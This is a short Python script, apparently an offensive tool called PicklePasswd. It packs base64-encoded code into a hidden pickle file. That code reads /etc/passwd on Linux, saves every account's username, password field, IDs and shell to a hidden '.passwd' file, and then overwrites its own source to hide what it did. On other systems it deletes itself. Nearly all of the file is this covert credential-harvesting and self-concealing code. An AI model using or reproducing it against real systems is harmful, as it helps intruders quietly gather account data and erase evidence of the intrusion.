#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# GitHub: https://github.com/Kourva/PicklePasswd
# Author: Kourva

# Resources
import pickle
import base64

# Get Information from target's account in /etc/passwd
code = """
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Resources
import platform
import os

# Self-modification: Delete main source code if platform is not Linux
if platform.system() != "Linux":
    os.unlink(__file__)

else:
    # Open .passwd file to store output 
    with open(".passwd", "w") as file, open("/etc/passwd", "r") as target:

        # Get information stored in /etc/passwd
        data = target.read().strip()

        # Make each data readable
        output = [
            (
                f"$$ Index {idx}\\n"
                f"  > Username : {info.split(':')[0]}\\n"
                f"  > Password : {info.split(':')[1]}\\n"
                f"  > User-ID  : {info.split(':')[2]}\\n"
                f"  > Group-ID : {info.split(':')[3]}\\n"
                f"  > UserInfo : {info.split(':')[4]}\\n"
                f"  > HomeDir  : {info.split(':')[5]}\\n"
                f"  > Shell    : {info.split(':')[6]}\\n"
            ) for idx, info in enumerate(data.split("\\n"))
        ]

        # Write data to output file
        for item in output:
            file.write(item + "\\n")

    # Self-modification: change main source code and hide script
    with open(__file__, "w") as this:
        this.write("# Hello World")
""".strip()

# Make hidden pickle file and encrypt data
with open(".script", "wb") as file:
    pickle.dump(
        base64.b64encode(code.encode()).decode(), file
    )